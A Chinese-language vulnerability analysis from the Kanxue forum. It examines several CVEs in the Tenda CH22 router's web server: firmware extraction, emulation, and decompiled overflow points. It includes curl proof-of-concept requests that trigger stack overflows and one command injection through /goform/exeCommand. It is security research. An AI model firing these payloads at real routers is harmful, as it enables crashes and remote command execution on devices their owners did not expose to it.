#  Tenda CH22 多个漏洞分析  
BornChu
                    BornChu  看雪学苑   2026-03-06 10:08  
  
**漏洞定位**  
  
  
  
从漏洞信息了解到，是通过网页配置访问到漏洞点的，直接分析http服务。  
### 提取httpd&仿真  
  
binwalk一把梭：  
  
```
iot@iot:~$ binwalk US_CH22V1BR_CH22_V1.0.0.1_CN.bin -Meiot@iot:~$ cd _US_CH22V1BR_CH22_V1.0.0.1_CN.bin.extracted/squashfs-root/biniot@iot:~/_US_CH22V1BR_CH22_V1.0.0.1_CN.bin.extracted/squashfs-root/bin$ file httpdhttpd:ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
```  
  
  
  
qemu直接起：  
  
```
iot@iot:~/_US_CH22V1BR_CH22_V1.0.0.1_CN.bin.extracted/squashfs-root$ cp /usr/bin/qemu-arm-static ./iot@iot:~/_US_CH22V1BR_CH22_V1.0.0.1_CN.bin.extracted/squashfs-root$ sudo chroot ./ ./qemu-arm-static ./bin/httpd
```  
  
### IDA分析  
  
根据字符串快速定位到路径处：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Cpo2XCpI7K0ibzNz8gEauiceX4j9eBtxNHQQ9VhyrgoultmxN8oicazMcAXExKSqmaicUE6bmVdNduTt5UQoohxB8MibVTHC5CFawhEb8Ns7p38Q/640?wx_fmt=other&from=appmsg "")  
![]( "")  
  
这一段应该是做的路径解析，如果路径不存在则通过websFormHandler返回error，存在则在sub_2DB50中做跳转  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Cpo2XCpI7K3Radh9oeZicv0DuM70pOcWxaK53aIKRlJJetzbVpQPEmy7ETAfQB2Yuef6IibUAH95hL4vyR2cPktobI32wkqmlcnw3VlddfxFY/640?wx_fmt=other&from=appmsg "")  
![]( "")  
  
  
这里不难看出，根据不同的路径会跳转到不同的解析里面，主要分为asp和非asp两类，找到位置就方便研究漏洞了。  
  
  
**CVE-2025-9813**  
  
  
  
这里先拿CVE-2025-9813分析，根据漏洞描述这个漏洞在/goform/SetSambaConf下，通过操作samba_userNameSda溢出。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Cpo2XCpI7K1T3MiatJj5sI4OgZ9TLiaxYLSM07KQLRKAvGlic6lmB0uvw9avHNUR4mo0WUuVS0dYTLAfbVmkNxv15VEyBnXatsg7m1GP2yTzcY/640?wx_fmt=other&from=appmsg "")  
![]( "")  
  
  
根据描述漏洞就在这一块了，传入的参数为s_1，大小可控，v3为s_1的总长度，v4为s_1从*  
起到末尾的长度，也就是说原本的输入可能类似于username*password  
  
在第60行s_1直接传给了s[256]，导致溢出。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Cpo2XCpI7K3CQlaMGayhMJZKcziboGgrpBqEdBfTaE362ibvTjhWnIMLXPF30oVD4icZHyFiaakSlQJA5icrIUQia3HT1pphYJub5VtBkd5YWJLSo/640?wx_fmt=other&from=appmsg "")  
![]( "")  
  
  
同样的问题也出在下方，只不过需要用到:  
做分隔，溢出点dest[256]就不过多赘述了。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Cpo2XCpI7K2iagNYlogP5surKwYxIvY3ibKfDQWlRYSWJ7hgLkCoiaqicmpD8fl4Nr3VHGBiaKmQh2TdEcA8AEoGxkedG0iaJ40CosicFnpAGoIU4s/640?wx_fmt=other&from=appmsg "")  
![]( "")  
  
  
PoC:  
  
```
curl -i -X POST 'http://192.168.127.100/goform/SetSambaConf' -d "samba_userNameSda=$(python3 -c "print('A' * 300 + '*')")"
```  
  
##   
  
****  
**CVE-2025-12271**  
  
  
  
  
CVE-2025-12271的情况也是同理  
  
  
从描述来看是需要利用/goform/RouteStatic中的page这个参数  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Cpo2XCpI7K0AyiblbbrGHJYe4YTO8sK4wBO24I33KKcqhHOSwV4iaibMXOxbqTg7lv6SAhYVugE0VjEDV3mibEY32TznMicN5w5JEroGq2sOQSTs/640?wx_fmt=other&from=appmsg "")  
![]( "")  
  
在fromRouteStatic这个函数中与前者不同的是，此函数会先将entrys以及mitInterface的值传入sub_39798这个函数中，不过并不存在判断条件，所以还是可以直接触发漏洞。  
  
  
漏洞点在于sprinf前未对v6的长度做校验，直接拼接前面的路径传入s，如果写exp需要注意偏移量。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Cpo2XCpI7K26dV90tdibianHUf3SMNTCI7FIu0sra2laUNKv40mb3qFcic0btUPAsdxkPBVYRMNBdXWYudECROiaYRprRywnAH9cV63IiaDrt6Uw/640?wx_fmt=other&from=appmsg "")  
![]( "")  
  
  
PoC:  
  
```
curl -i -X POST 'http://192.168.127.100/goform/RouteStatic' -d "page=$(python3 -c "print('A' *(300 - len('routing_static.asp?page=')))")"
```  
  
  
  
此外，类似的page溢出还有很多，原理都是sprint未经校验直接拼接重定向url导致。  
  
  
**CVE-2025-14526**  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Cpo2XCpI7K3aTdpST66Htg1VhKnRs4Ydq5hO97Zo4zpegGzOw7xKMspOZjLPicMhibZQeg1tMQJxtfMy43V8vjlrr2s96c5xU7TSaGJ92BauA/640?wx_fmt=other&from=appmsg "")  
![]( "")  
  
  
PoC:  
  
```
curl -i -X POST 'http://192.168.127.100/goform/L7Im' -d "page=$(python3 -c "print('A' *(300 - len('im.asp?page=%s')))")"
```  
  
##   
  
**CVE-2025-9812**  
  
  
  
结合通告信息，很明显是有溢出：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Cpo2XCpI7K3Qn4iaxoVkTicuZuOPaolUlN1BZ6jIQmX1jmSicjs69FhDYpGbxG3YyGa4Tw8YjUiaXybYlnArqoF3L2xxDuibZTiaxQ2wXI9wUkY0g/640?wx_fmt=other&from=appmsg "")  
![]( "")  
  
  
但实际上更大的问题在后面，可以使用;  
分隔实现命令注入。  
  
  
或许是由于使用的用户模式仿真，能够利用的函数较少，这里只贴个PoC没深入研究。  
  
  
PoC:  
  
```
curl -X POST -d "cmdinput=ping 127.0.0.1 -c 3; pwd; ls; cd bin/; pwd; ls; " http://192.168.127.100/goform/exeCommand
```  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Cpo2XCpI7K0FPkLSmu9Dd0SDxokKiaibFricgyCU6Q2o3PnxXZubLbQj30x3Nu9lhmBzrME4ocv4m9M8HAO1GuDxHCdxH53M0bwvlKIGhx6BWw/640?wx_fmt=other&from=appmsg "")  
![]( "")  
##   
  
**栈溢出漏洞列表**  
  
  
  
类似的漏洞还有很多，这里贴一张列表：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Cpo2XCpI7K1gF6p67We88LjaNO1y9VYlwjkltLSFwkib6VrhQ0JCVnHmQ8TwgwmK5UnaCY3PR9dTtmqT6gg5yqDawvZkVWIcTxwMmiaZHSGvk/640?wx_fmt=png&from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Cpo2XCpI7K3hCO61icicZNibUm1QicJVJXg0t2AnOSoA6nDu3SibXmPdoWTFibRyN1JX9dvJu8be6AXctoibJmUhJlosOUrvRk9Rl7j3JuaUe5cdQ8/640?wx_fmt=png&from=appmsg "")  
  
  
看雪ID：  
BornChu  
  
https://bbs.kanxue.com/user-home-964118.htm  
  
*本文为看雪论坛优秀文章，由   
BornChu  
   
原创，转载请注明来自看雪社区  
  
[](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458608775&idx=1&sn=7c7b03e3bb8ec5c26e42682a395478ce&scene=21#wechat_redirect)  
  
议题征集中！看雪·第十届安全开发者峰会  
  
  
# 往期推荐  
  
[IDA旧版本插件移植后卡死的研究及修复](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458595995&idx=1&sn=7861e1699b2afe72b1973c8529e76cff&scene=21#wechat_redirect)  
  
  
[神奇日游保护分析——从Frida的启动说起](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458595942&idx=1&sn=5474a50cdf6fa924e6cde1c034f06eef&scene=21#wechat_redirect)  
  
  
[Linux 3.10 版本编译 qemu仿真 busybox](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458595872&idx=1&sn=27acee2988a95060ede7a8b826b9a11b&scene=21#wechat_redirect)  
  
  
[深入理解IOS重签名检测](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458595848&idx=1&sn=39c6196cfee31db5bd7add19ebf6be9c&scene=21#wechat_redirect)  
  
  
[驱动挂钩所有内核导出函数来进行驱动逻辑分析](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458595727&idx=1&sn=9f3708ee6e109504785a4827d2de931b&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/Uia4617poZXP96fGaMPXib13V1bJ52yHq9ycD9Zv3WhiaRb2rKV6wghrNa4VyFR2wibBVNfZt3M5IuUiauQGHvxhQrA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8Hice1nuesdoDZjYQzRMv9tpvJW9icibkZBj9PNBzyQ4d4JFoAKxdnPqHWpMPQfNysVmcL1dtRqU7VyQ/640?wx_fmt=gif&from=appmsg "")  
  
**球分享**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8Hice1nuesdoDZjYQzRMv9tpvJW9icibkZBj9PNBzyQ4d4JFoAKxdnPqHWpMPQfNysVmcL1dtRqU7VyQ/640?wx_fmt=gif&from=appmsg "")  
  
**球点赞**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8Hice1nuesdoDZjYQzRMv9tpvJW9icibkZBj9PNBzyQ4d4JFoAKxdnPqHWpMPQfNysVmcL1dtRqU7VyQ/640?wx_fmt=gif&from=appmsg "")  
  
**球在看**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8Hice1nuesdoDZjYQzRMv9tpUHZDmkBpJ4khdIdVhiaSyOkxtAWuxJuTAs8aXISicVVUbxX09b1IWK0g/640?wx_fmt=gif&from=appmsg "")  
  
点击阅读原文查看更多  
  
